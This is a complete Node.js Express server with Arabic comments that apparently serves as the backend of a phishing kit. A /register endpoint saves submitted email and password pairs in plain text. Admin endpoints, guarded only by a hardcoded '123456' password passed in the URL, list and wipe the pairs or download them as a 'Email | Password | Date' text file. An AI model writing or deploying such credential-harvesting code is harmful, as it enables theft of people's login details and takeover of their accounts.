const express = require('express');
const fs = require('fs');
const cors = require('cors');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

const DB_FILE = 'users.json';
const ADMIN_PASSWORD = "123456"; // <<< غير ده للباسورد بتاعك

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, '[]');

// تسجيل البيانات
app.post('/register', (req, res) => {
    const { email, password } = req.body;
    const users = JSON.parse(fs.readFileSync(DB_FILE));
    users.push({ email, password, date: new Date().toLocaleString() });
    fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2));
    res.send('تم الحفظ');
});

// تسجيل دخول الادمن
app.post('/api/admin-login', (req, res) => {
    const { password } = req.body;
    if(password === ADMIN_PASSWORD){
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// جلب البيانات - لازم الباسورد
app.get('/api/users', (req, res) => {
    const { pass } = req.query;
    if(pass !== ADMIN_PASSWORD) return res.status(401).send('غير مصرح');
    const users = JSON.parse(fs.readFileSync(DB_FILE));
    res.json(users);
});

// مسح البيانات
app.delete('/api/users', (req, res) => {
    const { pass } = req.query;
    if(pass !== ADMIN_PASSWORD) return res.status(401).send('غير مصرح');
    fs.writeFileSync(DB_FILE, '[]');
    res.send('تم مسح كل البيانات');
});

// تحميل ملف
app.get('/api/download', (req, res) => {
    const { pass } = req.query;
    if(pass !== ADMIN_PASSWORD) return res.status(401).send('غير مصرح');
    const users = JSON.parse(fs.readFileSync(DB_FILE));
    let text = "Email | Password | Date\n--------------------------------\n";
    users.forEach(u => { text += `${u.email} | ${u.password} | ${u.date}\n`; });
    res.setHeader('Content-disposition', 'attachment; filename=emails.txt');
    res.setHeader('Content-type', 'text/plain');
    res.send(text);
});

app.listen(PORT, () => console.log(`شغال على http://localhost:${PORT}`));
module.exports = app